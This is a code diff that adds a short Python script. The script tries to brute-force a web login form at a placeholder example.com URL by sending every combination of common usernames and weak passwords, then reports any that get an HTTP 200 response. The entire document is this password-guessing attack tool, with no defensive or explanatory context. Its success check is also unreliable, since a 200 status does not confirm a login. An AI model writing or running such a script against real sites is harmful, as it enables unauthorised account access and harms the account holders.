@@ -1,0 +1,12 @@
+import requests
+
+target_url = "http://example.com/login"
+username_list = ["admin", "user", "test"]
+password_list = ["password", "123456", "qwerty"]
+
+for username in username_list:
+    for password in password_list:
+        response = requests.post(target_url, data={"username": username, "password": password})
+        if response.status_code == 200:
+            print("Login successful - username: " + username + " password: " + password)
+            break
